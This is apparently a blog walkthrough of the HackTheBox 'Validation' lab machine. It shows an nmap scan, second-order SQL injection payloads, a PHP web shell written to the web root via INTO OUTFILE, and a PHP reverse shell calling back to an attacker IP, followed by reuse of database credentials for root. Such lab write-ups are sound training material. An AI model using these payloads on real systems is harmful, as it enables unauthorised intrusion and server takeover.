---
# multilingual page pair id, this must pair with translations of this page. (This name must be unique)
#lng_pair: id_autogeneratedsamplecontent_4
title: HTB Validation

# post specific
# if not specified, .name will be used from _data/owner/[language].yml
#author: ""
# multiple category is not supported
category: Walkthrough
# multiple tag entries are possible
tags: [Walkthrough, HackTheBox, Linux, Easy]
# thumbnail image for post
img: ":/validation/TNValidation.png"
# disable comments on this page
comments_disable: true

# publish date
date: 2021-12-6 14:47:12 +0900    

# seo
# if not specified, date will be used.
#meta_modify_date: 2021-09-13 14:47:12 +0900
# check the meta_common_description in _data/owner/[language].yml
meta_description: "HTB Validation Walkthrough | Easy rated Linux machine for beginners"

# optional
# if you enabled image_viewer_posts you don't need to enable this. This is only if image_viewer_posts = false
#image_viewer_on: true
# if you enabled image_lazy_loader_posts you don't need to enable this. This is only if image_lazy_loader_posts = false
#image_lazy_loader_on: true
# exclude from on site search
#on_site_search_exclude: true
# exclude from search engines
#search_engine_exclude: true
# to disable this page, simply set published: false or delete this file
#published: false
---

{%- comment -%} Please delete below and place your page content here {%- endcomment -%}

<!-- outline-start -->
<!--
{{ website_info_text_first }}[<img src="https://img.shields.io/github/issues/MrGreensWorkshop/MrGreen-JekyllTheme" alt="GitHub issues" data-no-image-viewer>](https://github.com/MrGreensWorkshop/MrGreen-JekyllTheme/issues)
[<img src="https://img.shields.io/github/forks/MrGreensWorkshop/MrGreen-JekyllTheme" alt="GitHub forks" data-no-image-viewer>](https://github.com/MrGreensWorkshop/MrGreen-JekyllTheme/blob/main/README.md#readme)
[<img src="https://img.shields.io/github/stars/MrGreensWorkshop/MrGreen-JekyllTheme" alt="GitHub stars" data-no-image-viewer>](https://github.com/MrGreensWorkshop/MrGreen-JekyllTheme/blob/main/README.md#readme)
[<img src="https://img.shields.io/github/license/MrGreensWorkshop/MrGreen-JekyllTheme" alt="GitHub license" data-no-image-viewer>](https://github.com/MrGreensWorkshop/MrGreen-JekyllTheme/blob/main/LICENSE)
[<img src="https://shields.io/badge/Patreon-Tip%20me-blue?logo=Patreon" alt="Tip Me via Patreon" data-no-image-viewer>](https://patreon.com/MrGreensWorkshop "Tip Me via Patreon")
[<img src="https://shields.io/badge/Ko--fi-Tip%20me-blue?logo=kofi" alt="Tip Me via Ko-fi" data-no-image-viewer>](https://ko-fi.com/MrGreensWorkshop "Tip Me via Ko-fi")

 outline-end -->

![HTB Validation Cover](:/validation/Validation.png){:data-align="center"}

***

### Reconnaissance
***

#### Nmap Scan
***

First, we run nmap scan to check for open ports and the service running on them.
{% highlight bash %}
nmap -sC -sV -A 10.10.11.116
Not shown: 991 closed ports
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http          Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
513/tcp  filtered login
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
8080/tcp open     http          nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<br>

- **-sC :** default script scanning
- **-sV :** service version scanning
- **-A :** aggressive scanning

We see 3 ports are open:
- **Port 22 :** ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
- **Port 80 :** http Apache httpd 2.4.48
- **Port 8080 :** Bad Gateway

Nothing interseting comes up hunting for CVE for the service versions running.
Let's dig into the website on port 80.

### Enumeration
***
#### Webpage Enumeration
***
Landing Page

<br>

![landing page of website](:/validation/1.png){:data-align="center"}
<br>

Got redirected to another page which is supposed to have logs of other people.

<br>

![Logs page for brazil](:/validation/2.png){:data-align="center"}
<br>

Let's try for SQL injection here.
Maybe we can get some interesting info from the database.

<br>

![first SQL attempt](:/validation/3.png){:data-align="center"}
<br>

Looks like a failed SQL injection, whole of the query statement got taken in as the input.
That is nothing escaped the input field.

#### Intercepting request with burpsuite
***

![Burp request](:/validation/4.png){:data-align="center"}
<br>

Intersepting the POST request in buptsuit we can see the "country" input we can meddle with with SQL injection.

{% highlight Burp %}
username=utkc&country=Brazil' or 1=1 #
{% endhighlight %}

<br>

It's a hit!!
The error message indicates a second order SQL injection.

<br>

![tried for SQL injection in country input](:/validation/5.png){:data-align="center"}
<br>

The input is being stored and when used, is not being parsed properly.
But the injected query failed for some reason.


{% highlight Burp %}
username=utkc1&country=Albania' or 1=1 #
{% endhighlight %}

<br>

Trying the same query again with a different username and country made it work.

<br>

![Second try with different username and country](:/validation/6.png){:data-align="center"}
<br>

#### UNION based SQL injection
***
Let's try some UNION based SQL queries.
First let's determine the number of columns.


{% highlight Burp %}
username=utkc1&country=Albania' ORDER BY 1 #
{% endhighlight %}

<br>

We increment the number until we get an error message.

<br>

![error message in order by query](:/validation/7.png){:data-align="center"}
<br>

Got this error message for ORDER BY 2, it seems to have just one coulmn.
Now let's get the database name, version and user.

{% highlight Burp %}
username=utkc2&country=Algeria' UNION SELECT database() #
    registration
username=utkc2&country=Algeria' UNION SELECT version() #
    10.5.11-MariaDB-1
username=utkc2&country=Algeria' UNION SELECT user() #
    uhc@localhost
{% endhighlight %}

<br>

I enumerated the database bit further, but didn't find anything intresting.

### Gaining an Initial Foothold
***
Lets try uploading a file to the server.

{% highlight Burp %}
username=utkc2&country=Algeria' UNION SELECT "hello" into outfile '/var/www/html/hello.txt' #
{% endhighlight %}

<br>

![making a twst file with SQL injection query](:/validation/8.png){:data-align="center"}
<br>

This gave an error but it still worked when I checked the URL.

<br>

![test injected website](:/validation/9.png){:data-align="center"}
<br>

Let's put a backdoor php code in the file.

{% highlight Burp %}
country=Algeria' UNION SELECT '&lt;?php system($_GET["cmd"]) ?>' into outfile '/var/www/html/cmd.php' #
{% endhighlight %}

<br>

![backdoor](:/validation/10.png){:data-align="center"}
<br>

It worked!
Let's get a reverse shell now.

<br>

![not netcat](:/validation/11.png){:data-align="center"}
<br>

The machine dosen't have netcat.

#### Reverse Shell
***
We can go to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to try some reverse shells.
Let's set up a netcat listner first:

{% highlight Bash %}
nc -lnvp 4444
{% endhighlight %}

<br>

Reverse shell Payload:

{% highlight payload %}
?cmd=php -r '$sock=fsockopen("10.10.14.20",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
{% endhighlight %}

<br>

![reverse shell cought on netcat](:/validation/12.png){:data-align="center"}
<br>
And we got ourselves a revershe shell.
Let's get the user flag

<br>

![user flag](:/validation/13.png){:data-align="center"}
<br>

### Privilege Escalation
***
Getting the root flag on this machine was pretty easy.
Credentials file was right where we landed when we got the shell!

Let's got to the <kbd>html</kbd> directory and look into <kbd>config.php</kbd> file.

<br>

![config file exploration](:/validation/14.png){:data-align="center"}
<br>

Here we have credentails to connect to sql server for user <kbd>uhc</kbd>
Let's try to use these credentials to access root user.

<br>

![root flag](:/validation/15.png){:data-align="center"}
<br>

### Lesson Learned
***
HackTheBox: Validation is an Easy Linux Box that is good for beginners to practice their SQL injection skills.

This box seems to be focused on Web Penetration and is pretty relaxed on the Privesc side.

Here are some takeaways from this Writeup:

- Second order SQL injections are stored SQL queries which are used improperly in the application.

- Always hunt for clear text passwords (If you find a password in a CTF, it is meant to be there for a reason).